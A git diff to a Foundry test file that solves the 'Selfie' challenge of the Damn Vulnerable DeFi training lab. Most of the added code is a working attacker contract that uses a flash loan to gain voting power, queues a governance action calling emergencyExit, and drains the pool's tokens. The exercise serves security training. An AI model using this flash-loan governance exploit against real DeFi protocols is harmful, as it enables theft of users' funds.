@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +64,20 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        PoolAttacker attacker = new PoolAttacker(
+            address(pool),
+            address(governance),
+            address(token),
+            recovery
+        );
+
+        attacker.submitAttackProposal();
+
+        // Fast forward time to be able to execute the proposal
+        vm.warp(block.timestamp + 2 days + 1 hours);
+        vm.roll(block.number + 2 days + 1 hours);
+
+        attacker.executeAttackProposal();
     }
 
     /**
@@ -71,6 +86,83 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract PoolAttacker is IERC3156FlashBorrower {
+    error PoolAttacker_NotRequestedFlashLoan();
+
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes poolToken;
+    address owner;
+    address recoveryAddress;
+    uint256 actionId;
+
+    constructor(
+        address _pool,
+        address _governance,
+        address _token,
+        address _recoveryAddress
+    ) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        poolToken = DamnValuableVotes(_token);
+        recoveryAddress = _recoveryAddress;
+        owner = msg.sender;
+    }
+
+    function submitAttackProposal() external {
+        uint256 maxTokenFlashLoanAmount = pool.maxFlashLoan(address(poolToken));
+
+        address target = address(pool);
+        uint256 value = 0;
+        bytes memory data = abi.encodeWithSelector(
+            SelfiePool.emergencyExit.selector,
+            recoveryAddress
+        );
+
+        pool.flashLoan(
+            IERC3156FlashBorrower(address(this)),
+            address(poolToken),
+            maxTokenFlashLoanAmount,
+            abi.encode(target, value, data)
+        );
+    }
+
+    function executeAttackProposal() external {
+        governance.executeAction(actionId);
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        if (initiator != address(this)) {
+            revert PoolAttacker_NotRequestedFlashLoan();
+        }
+
+        poolToken.delegate(address(this));
+        (address target, uint256 value, bytes memory call_data) = abi.decode(
+            data,
+            (address, uint256, bytes)
+        );
+
+        actionId = governance.queueAction(target, uint128(value), call_data);
+
+        bool result = IERC20(token).approve(msg.sender, amount + fee);
+        if (!result) {
+            revert("Token approval failed");
+        }
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
